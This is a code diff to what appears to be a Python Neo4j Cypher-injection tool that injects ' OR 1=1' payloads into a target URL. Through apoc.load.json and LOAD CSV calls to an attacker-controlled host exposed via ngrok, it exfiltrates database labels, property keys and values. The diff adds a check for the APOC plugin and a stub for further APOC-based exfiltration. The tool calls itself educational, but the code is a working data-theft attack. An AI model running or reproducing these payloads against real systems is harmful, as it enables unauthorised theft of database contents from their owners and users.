@@ -13,7 +13,8 @@ import json
 import os
 from tabulate import tabulate
 from pyngrok import ngrok
-import time
+from packaging import version
+
 
 data_queue = queue.Queue()
 
@@ -189,10 +190,40 @@ class Neo4jInjector:
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
+        
         nested_dict = {'-': parsed_data}
         json_result = json.dumps(nested_dict)
         write_json_to_file(json_result, "version.json")
         json_to_table(json_result)
+
+
+        print("Apoc Check")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_installed=True') YIELD value RETURN value//")
+        apoc_installed = True
+        if data_queue.empty():
+            parsed_data = {'apoc_installed': 'False'}
+            nested_dict = {'-': parsed_data}
+            apoc_installed = False
+        else:
+            data = data_queue.get()  # Retrieve the next item from the queue
+            parsed_data = extract_query_params(data)  # Use the previously defined function
+        
+    
+
+        nested_dict = {'-': parsed_data}
+        json_result = json.dumps(nested_dict)
+        write_json_to_file(json_result, "apoc_installed.json")
+        json_to_table(json_result)
+
+        if apoc_installed:
+            return True
+
+        # version = parsed_data.get("version")
+        # if version.parse(given_version) >= version.parse("5.0"):
+        #     print(f"Version {given_version} is greater than or equal to 5.0")
+        # else:
+        #     print(f"Version {given_version} is less than 5.0")
+
 
 
         print("Dumping labels count")
@@ -200,7 +231,7 @@ class Neo4jInjector:
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
-        label_count = parsed_data.get('label_count', None)  # Extract the label value
+        label_count = parsed_data.get('label_count')  # Extract the label value
         
         print("Dumping Labels")
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
@@ -210,7 +241,7 @@ class Neo4jInjector:
         for _ in range(int(label_count)):
             data = data_queue.get()  # Retrieve the next item from the queue
             parsed_data = extract_query_params(data)  # Use the previously defined function
-            label_value = parsed_data.get('label', None)  # Extract the label value
+            label_value = parsed_data.get('label')  # Extract the label value
             labels.append(label_value)
 
 
@@ -224,9 +255,8 @@ class Neo4jInjector:
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
-        value_count = parsed_data.get('value_count', None)  # Extract the label value
+        value_count = parsed_data.get('value_count')  # Extract the label value
 
-        print("Dumping Values Property=Value")
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM '{self.exfil_ip}/?' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
 
 
@@ -248,7 +278,10 @@ class Neo4jInjector:
         write_json_to_file(json_result, "data.json")
         json_to_table(json_result)
 
-        
+    def apoc_exfil_data(self):
+        print("Inside apoc exfil data")
+
+
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
@@ -295,7 +328,10 @@ def main():
         print("This version of the program only supports injection detection of API methods")
 
     # Begin exfiltration process
-    injector.exfil_data()
+    apoc_installed = injector.exfil_data()
+    if apoc_installed:
+        injector.apoc_exfil_data()
+
 
     listener.stop_listener()
     listener_thread.join()
